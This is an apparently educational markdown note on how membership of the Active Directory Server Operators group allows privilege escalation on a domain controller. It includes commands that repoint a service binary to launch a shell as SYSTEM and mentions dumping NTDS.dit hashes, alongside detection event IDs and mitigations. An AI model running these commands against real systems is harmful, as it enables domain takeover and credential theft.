---
title: Server Operators — service privileges on a DC
tags: [windows, active-directory, server-operators, privesc, services]
---

# Server Operators: the group that does not look administrative

**English** | [🇪🇸 Español](server-operators.md)

## 1. What it is

**Server Operators** is a built-in Active Directory group. On a domain controller its members can:

- Start and stop services.
- Change service configuration (`SERVICE_CHANGE_CONFIG`).
- Back up and restore files.
- Change the system time.
- Shut down the machine.
- Log on locally to the DC.

They are not `Domain Admins`, but they can reconfigure a service running as `LocalSystem` and execute code as SYSTEM. That is a direct escalation.

## 2. Enumeration

```cmd
whoami /groups | findstr /i "Server Operators"
net localgroup "Server Operators"
sc.exe query state= all
sc.exe qc <SERVICE>
```

```powershell
Get-LocalGroupMember -Group 'Server Operators'
Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName,State
```

Focus on existing services that can be restarted without breaking the system. `VSS`, `Spooler`, `RemoteRegistry` or a DC-specific service are candidates.

## 3. Reconfigure the binary

```cmd
sc.exe qc VSS
sc.exe config VSS binPath= "C:\Windows\System32\cmd.exe /c C:\ProgramData\shell.exe"
sc.exe start VSS
```

If the service fails to start (error 1053), the child may still have run. Check the listener. To revert:

```cmd
sc.exe config VSS binPath= "C:\Windows\System32\svchost.exe -k netsvcs -p"
sc.exe start VSS
```

You can also use `sc.exe sdset` to grant permissions, or `reg add` on `HKLM\SYSTEM\CurrentControlSet\Services\<SVC>\ImagePath`.

## 4. Alternatives

- **Backup/restore**: `SeBackupPrivilege` copies `NTDS.dit` and the registry; `secretsdump.py -ntds` extracts hashes.
- **Scheduled tasks**: if the group can create tasks running as SYSTEM.
- **Time change**: useful for Kerberos tickets, not execution.
- **Stopping services**: can interrupt defences, but is noisy.

## 5. Detection

- **7045**: service installed.
- **4697**: service installed on the system (Security log).
- **4624** type 3/10 on the DC from a user workstation.
- **4672** with service privileges for an account that does not normally use them.
- `ImagePath` and service configuration changes (Event ID 7040).
- Child processes of `services.exe` from `Temp`/`ProgramData`.

## 6. Mitigation

- Keep `Server Operators` empty or limited to a few human accounts.
- Separate administrative and user accounts.
- Monitor group membership and service changes.
- Apply least privilege to third-party services.
- Use LAPS and rotate service credentials.

MITRE: T1543.003, T1078.002, T1003.003.

## 7. References

- <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups>
- <https://attack.mitre.org/techniques/T1543/003/>
- <https://0xdf.gitlab.io/2022/05/05/htb-return.html>
